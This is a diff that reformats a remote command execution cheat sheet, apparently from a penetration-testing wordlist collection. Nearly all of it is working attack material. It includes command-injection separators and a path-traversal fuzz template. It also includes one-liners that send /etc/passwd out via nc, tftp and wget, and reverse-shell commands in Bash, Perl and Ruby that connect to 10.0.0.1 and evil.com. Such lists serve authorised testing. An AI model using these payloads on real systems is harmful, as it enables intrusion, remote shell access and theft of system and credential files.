@@ -2,70 +2,65 @@ Remote Command Exec Cheatsheet
 
 File notes:
 
-source-disc-cmd-exec-traversal.fuzz.txt
-# single directory traversals that have caused showcode or command exec issues in the past
-# GET /path/*payload*relative/path/to/target/file/
+**source-disc-cmd-exec-traversal.fuzz.txt**
 
+usage:
+```GET /path/*payload*relative/path/to/target/file/```
 
-   Executing Commands
+**Executing Commands**
 
 Seperating Commands: 
-blah;blah2
+```blah;blah2```
 
-PIPEZ: 
-blah ^ blah2
+PIPES: 
+```blah ^ blah2```
 
 AND: 
-blah && blah2
+```blah && blah2```
 
 OR: 
-FAIL || X
+```FAIL || X```
 
 OR: 
-blah%0Dblah2%0Dblah3
+```blah%0Dblah2%0Dblah3```
 
 Backtick: 
-`blah`
+``` `blah` ```
 
 Background: 
-`blah & blah2`
+'`blah & blah2`'
 
-
-
-   Exfiltrating Files / Data
+**Exfiltrating Files / Data**
 
 FTP: 
 Make a new text file, and echo and then redirect to FTP
 
 NC: 
-nc -e /bin/sh
+``` 'nc -e /bin/sh' ```
 
 NC: 
-echo /etc/passwd  | nc host port
+``` 'echo /etc/passwd  | nc host port' ```
 
 TFTP: 
-echo put /etc/passwd | tftp host
+``` 'echo put /etc/passwd | tftp host' ```
 
 WGET: 
-wget --post-file /etc/passwd
+``` 'wget --post-file /etc/passwd' ```
 
-
-
-   One-Liner Reverse Shells
-
+**One-Liner Reverse Shells**
 
 On the listener: 
-$ nc -l -p 8080 -vvv
+'$ nc -l -p 8080 -vvv'
 
 On the remote host...
 Bash:
-$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+'$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
 
-$ exec 5<>/dev/tcp/evil.com/8080
-$ cat <&5 | while read line; do $line 2>&5 >&5; done
+'$ exec 5<>/dev/tcp/evil.com/8080'
+'$ cat <&5 | while read line; do $line 2>&5 >&5; done'
 
 Perl:
-$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+'$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};''
 
 Ruby:
 $ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
